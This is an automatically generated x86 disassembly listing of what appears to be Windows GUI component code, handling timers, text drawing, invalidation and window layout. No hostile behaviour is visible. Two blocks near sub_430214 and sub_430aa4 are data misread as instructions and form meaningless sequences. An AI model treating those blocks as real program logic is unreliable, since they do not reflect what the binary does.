mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_42f6b8
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sub eax 0x2
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_42f6b8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
dec eax
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_42f6b8
pop ecx
sub_42f980
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420754
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_42fa08
call sub_4218a0
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_42f9d0
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42fa7c
mov eax [ esi + 0x34 ]
call sub_421954
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4207a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_42fa08
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42fa42
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40338c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42fa7c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42fafb
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fb02
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b864
call sub_40395c
sub_42fb54
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_455750
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_43c850
call sub_43c930
test al al
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov edx 0xb9
mov eax esi
call sub_44c948
mov edx 0x29
mov eax esi
call sub_44c96c
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_42ffa4
mov edx 0x1
mov eax esi
call sub_42ffc0
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_44d32c
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_453d1c
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_42fc18
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_450914
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_42fc88
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4530a0
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_451028
sub_42fcc8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42fdb8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_44d18c
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_451f64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42fdbf
lea eax [ ebp - 0x14 ]
call sub_403f20
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_453a88
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_453a88
push eax
call InvalidateRect
sub_42fdc8
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_42fe00
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42ff62
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_42f4c4
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_42fdc8
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_42f4c4
mov esi [ ebx + 0x208 ]
call sub_43c850
call sub_43c930
test al al
je r-xdata
push ebp
call sub_42fdc8
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_42f4c4
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_42420c
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4245b0
mov eax ebx
call sub_454c88
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_44f46c
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44d18c
mov eax [ ebp - 0x1c ]
call sub_4043e0
push eax
mov eax esi
call sub_424a0c
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ff69
lea eax [ ebp - 0x1c ]
call sub_403f20
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_424328
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_42492c
mov edx r-xdata
mov eax esi
call sub_424888
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_430014
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44faf4
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_43006c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45271c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_43018d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_45271c
call sub_403a08
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44c96c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_44c948
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_4301a8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_4545d0
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_4301d4
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_454c90
pop esi
pop ebx
retn
sub_430214
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
add eax [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x3
inc ebx
add [ eax + 0x3 ] al
inc ebx
add [ edx + eax ] bl
add [ eax ] al
cmp [ ecx ] al
inc esp
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
cld
add eax [ ebx ]
mov al [ 0xffffffffc8004545 ]
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ eax + ecx * 2 + 0x40b40044 ] ch
inc ebp
add al dl
inc ebp
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
sub_4302b2
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax + 0x48 ] cl
inc esp
inc esp
add al cl
hlt
sub_430378
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_4448ac
mov edx edi
mov eax [ esi + 0x210 ]
call sub_418314
xor edx edx
mov eax edi
call sub_44d0ac
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_44d300
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_4307a8
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_4303fc
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_41860c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44f8d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_430434
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_430499
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_444bac
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_43049e
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46d2bc
call sub_4039d8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4304c4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_452a6c
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_40338c
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_430504
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_4528b4
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_40338c
pop edx
pop esi
pop ebx
retn
sub_430530
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_440e60
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_4307e0
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_4305c0
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_430854
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_403190
mov eax [ esi + 0x210 ]
call sub_403190
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4557ac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_430610
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_423a54
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_430799
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_453a88
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_44d0ac
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_44cb90
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_418470
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_40338c
test al al
je r-xdata
sub_4307a8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_4184cc
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_44cd98
mov eax ebx
mov si 0xffeb
call sub_40338c
sub_4307e0
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_430958
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_430854
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_430378
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_418558
call sub_403190
pop edi
pop esi
pop ebx
retn
sub_430894
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_430610
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4308cc
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp esi 0xffffffff
jge r-xdata
mov [ ebx + 0x218 ] esi
jmp r-xdata
mov ebp [ ebx + 0x210 ]
mov eax [ ebp + 0x8 ]
cmp esi eax
jl r-xdata
or esi 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x218 ]
cmp esi edi
je r-xdata
mov esi eax
dec esi
test edi edi
jl r-xdata
mov edi esi
mov [ ebx + 0x218 ] edi
test edi edi
jl r-xdata
mov edx edi
mov eax ebp
call sub_418470
xor edx edx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_418470
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
sub_430958
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_430a21
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx eax
mov eax ebx
call sub_430854
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebx + 0x218 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
mov eax ebx
call sub_430610
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430a28
lea eax [ ebp - 0x8 ]
call sub_403f20
retn
mov [ ebx + 0x221 ] 0x1
mov edx [ ebx + 0x218 ]
mov eax [ ebx + 0x210 ]
call sub_418470
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov [ ebx + 0x221 ] 0x0
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebx + 0x214 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_418470
pop edx
call sub_44d1bc
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
sub_430a30
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_452f74
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov edx edi
mov eax [ ebx + 0x210 ]
call sub_418470
pop edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
inc edi
dec esi
jne r-xdata
sub_430aa4
out 0x47 al
add [ edi ] ah
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
out 0x47 al
add [ 0x640000ff ] ch
out 0x47 al
add [ esi ] ch
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
out 0x47 al
add [ 0x640000ff ] dl
out 0x47 al
add [ esi ] dl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
out 0x47 al
add [ 0x640000ff ] bl
out 0x47 al
add [ esi ] bl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
out 0x47 al
add [ 0x640000ff ] al
out 0x47 al
add [ esi ] al
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
out 0x47 al
add [ 0x640000ff ] cl
out 0x47 al
add [ esi ] cl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi ] cl
inc [ eax ]
add [ esi + 0x47 ] ah
add al dh
inc [ eax ]
